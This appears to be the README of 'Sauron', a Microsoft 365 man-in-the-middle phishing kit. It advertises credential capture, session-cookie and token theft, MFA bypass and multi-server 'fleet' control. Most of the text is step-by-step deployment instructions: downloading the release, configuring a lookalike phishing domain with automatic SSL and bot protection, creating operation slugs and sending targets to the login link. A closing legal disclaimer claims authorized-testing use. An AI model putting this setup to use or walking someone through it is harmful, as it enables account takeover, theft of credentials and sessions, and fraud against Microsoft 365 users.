
# Sauron - Microsoft 365 MITM Proxy

Microsoft 365 login flow interception for credential capture and session harvesting.

## 🎯 What It Does

- **Captures Credentials**: Real-time username/password capture
- **Steals Sessions**: Microsoft authentication cookies and tokens
- **2FA Bypass**: Multi-factor authentication token harvesting
- **Live Monitoring**: WebSocket dashboard for real-time operations
- **SSL Automation**: Automatic HTTPS certificates
- **Fleet Management**: Deploy and control multiple VPS instances from central master controller

## 🚀 Installation

### Requirements

- Ubuntu 20.04+ VPS with root access
- Domain name pointed to your server
- Cloudflare account (free tier works)
- **Firebase project with Firestore enabled**
- **Firebase Admin SDK service account key (`firebaseAdmin.json`)**

### Production Release (Linux VPS)

```bash
# 1. Download the latest Linux release
wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz

# 2. Extract and install
tar -xzf sauron-linux-amd64.tar.gz
cd sauron

# 3. Add your Firebase Admin SDK key
# Download firebaseAdmin.json from your Firebase project console
# and place it in the sauron directory
cp /path/to/your/firebaseAdmin.json .

# 4. One-command setup (handles everything automatically)
sudo ./install-production.sh

# 5. Get help anytime
./help.sh
```

**That's it!** The installer will:

- Install Docker and system dependencies automatically
- Walk you through Cloudflare setup step-by-step
- Configure SSL certificates with Let's Encrypt
- Start Sauron service automatically

### 🎯 Quick Help

```bash
# Show all available commands and current status
./help.sh
```

This command shows you:

- ✅ All available management commands
- ✅ Configuration and troubleshooting options  
- ✅ Current system status
- ✅ Quick actions and emergency commands

- Install Docker and system dependencies automatically
- Walk you through Cloudflare setup step-by-step
- Configure SSL certificates with Let's Encrypt
- Start Sauron service automatically

### 🔧 Configuration Management

**Interactive Configuration Setup:**

```bash
# Run interactive configuration wizard
./configure-env.sh

# Validate current configuration
./configure-env.sh --check

# Show configuration status
./configure-env.sh --status
```

**Manual Configuration:**
Edit `.env` file with your settings:

```bash
# Your phishing domain
SAURON_DOMAIN=securelogin365.com

# Cloudflare API token (for SSL automation)
CLOUDFLARE_API_TOKEN=your_token_here

# Turnstile secret (optional bot protection)
TURNSTILE_SECRET=your_secret_here
```

### 🔄 Updates

**Automatic Updates:**

```bash
# Check for and install updates automatically
sudo ./update-sauron.sh --force

# Check for updates without installing
sudo ./update-sauron.sh --check
```

## �📱 Usage

### Access Points

- **Admin Panel**: `https://yourdomain.com/admin`
- **Statistics**: `https://yourdomain.com/stats`
- **WebSocket**: `wss://yourdomain.com/ws`

### Creating Operations

1. Open admin panel: `https://yourdomain.com/admin`
2. Create a new slug (operation identifier)
3. Send targets to: `https://login.yourdomain.com/your-slug`

### Management Commands

```bash
# Check status
sudo systemctl status sauron

# View logs
sudo journalctl -u sauron -f

# Restart service
sudo systemctl restart sauron

# Check version
/usr/local/bin/sauron --version

# Full system verification
./verify-installation.sh

# Test Firebase connectivity
./test-firebase.sh
```

### 🔧 Configuration Helpers

```bash
# Interactive configuration wizard (default)
./configure-env.sh

# Quick status check
./configure-env.sh --status

# Validate configuration
./configure-env.sh --check

# Test domain connectivity
./configure-env.sh --test-domain

# Check SSL certificates
./configure-env.sh --check-ssl

# Show current configuration
./configure-env.sh show
```

## 🆘 Troubleshooting

### Common Issues & Quick Fixes

#### 🔴 Service won't start

```bash
# Check service status and logs
sudo systemctl status sauron
sudo journalctl -u sauron --no-pager -l

# Verify installation
./verify-installation.sh

# Check configuration
./configure-env.sh --check
```

#### 🔴 "Domain not reachable" errors

```bash
# Test DNS resolution
dig yourdomain.com

# Verify domain points to your server
curl -I https://yourdomain.com

# Check Cloudflare configuration
./configure-env.sh --test-domain
```

#### 🔴 SSL certificate issues

```bash
# Check certificate status
./configure-env.sh --check-ssl

# Manual certificate renewal
sudo acme.sh --renew -d yourdomain.com

# View certificate logs
sudo journalctl -u acme.sh -f
```

#### 🔴 Configuration problems

```bash
# Run configuration wizard
./configure-env.sh

# Reset to defaults
cp .env.example .env
./configure-env.sh
```

#### 🔴 Firebase connection issues

```bash
# Test Firebase connectivity
./test-firebase.sh

# Check Firebase credentials file exists
ls -la firebaseAdmin.json

# Verify Firestore logs
grep -i "firebase\|firestore" logs/system.log

# If firebaseAdmin.json is missing:
# 1. Go to Firebase Console: https://console.firebase.google.com
# 2. Select your project
# 3. Go to Project Settings > Service Accounts
# 4. Generate new private key
# 5. Download as firebaseAdmin.json
# 6. Upload to your server's sauron directory
```

## � Fleet Management System

**NEW**: Deploy and control multiple Sauron-Pro instances across different VPS servers from a centralized master controller.

### 🏛️ Architecture

- **Master Controller**: Single server that manages the entire VPS fleet
- **VPS Agents**: Individual Sauron instances that register with the master
- **Distributed MITM**: Coordinate operations across multiple geographic locations
- **Centralized Control**: Manage all VPS instances from one admin interface

### 📋 Quick Deployment

**Deploy Master Controller:**

```bash
# Set your master domain
export DOMAIN=master.example.com
sudo ./deploy-fleet-master.sh
```

**Deploy VPS Agents (on each VPS):**

```bash
# Point to your master controller
export MASTER_URL=https://admin.example.com:8443
export VPS_ID=vps-001
sudo ./deploy-vps-agent.sh
```

### 🎮 Fleet Management

```bash
# View all VPS instances
/opt/sauron-pro/bin/fleet-status

# Send commands to specific VPS
/opt/sauron-pro/bin/fleet-command vps-001 status
/opt/sauron-pro/bin/fleet-command vps-001 restart
/opt/sauron-pro/bin/fleet-command vps-001 script '{"script": "update.sh"}'

# Execute on all active VPS
for vps in $(curl -s https://master.example.com:8443/fleet/instances | jq -r '.instances[] | select(.status=="active") | .id'); do
  /opt/sauron-pro/bin/fleet-command $vps script '{"script": "cleanup.sh"}'
done
```

### 📖 Complete Documentation

- **[Fleet Management Guide](docs/FLEET_MANAGEMENT.md)** - Complete setup and usage
- **[Fleet Management Dashboard](docs/fleet-management.html)** - Interactive web documentation

## 🛠️ Development

### Building Releases

```bash
# Build binary release package (auto-versioned)
./scripts/build-release.sh

# Build with specific version
./scripts/build-release.sh v2025.08.15-custom

# Deploy to production server
./scripts/deploy-production.sh
```

### Development Build (Source Access)

```bash
# Only if you have source code access
git clone https://github.com/Skillz147/Sauron-Pro.git
cd Sauron-Pro
sudo ./install/setup.sh
```

### Project Structure

- `scripts/` - Build and deployment automation scripts
- `docs/` - Documentation and API reference
- `.env.example` - Configuration template
- `LICENSE` - MIT license with security tool disclaimers
- **Note**: Source code is not included in this repository for security purposes

## 📚 Documentation

**[📖 Full Documentation](https://skillz147.github.io/Sauron-Pro)**

Includes:

- Advanced configuration options
- API endpoint documentation
- Troubleshooting guides
- Security best practices

## ⚠️ Legal Notice & Disclaimer

### IMPORTANT: READ BEFORE USE

This software is provided for **educational and authorized security testing purposes only**. By downloading, installing, or using this software, you acknowledge and agree to the following:

### 🔒 Authorized Use Only

- This tool is intended **ONLY** for authorized penetration testing, security research, and educational purposes
- You must have **explicit written permission** from the target system owner before use
- Unauthorized access to computer systems is **illegal** and may violate local, state, federal, and international laws

### 🚫 Prohibited Activities

- **DO NOT** use this software for unauthorized access to any system
- **DO NOT** use this software for malicious purposes, fraud, or illegal activities
- **DO NOT** use this software to violate any applicable laws or regulations

### 🛡️ Disclaimer of Liability

- The authors and contributors provide this software **"AS IS"** without any warranties
- **NO LIABILITY** is accepted for any damages, losses, or legal consequences resulting from use
- Users assume **FULL RESPONSIBILITY** for compliance with applicable laws
- The authors **DISCLAIM ALL LIABILITY** for misuse of this software

### 📋 User Responsibilities

- Verify legal compliance in your jurisdiction before use
- Obtain proper authorization before conducting any security tests
- Use responsibly and ethically in accordance with applicable laws
- Report vulnerabilities through proper disclosure channels

### 🏛️ Jurisdiction & Compliance

- Users are responsible for compliance with all applicable laws including but not limited to:
  - Computer Fraud and Abuse Act (CFAA)
  - Digital Millennium Copyright Act (DMCA)
  - General Data Protection Regulation (GDPR)
  - Local privacy and cybersecurity regulations

**By using this software, you acknowledge that you have read, understood, and agree to be bound by these terms.**

## 📄 License

This project is licensed under the MIT License with additional security tool disclaimers - see the [LICENSE](LICENSE) file for details.

---

**For questions or issues, check the documentation or open a GitHub issue.**
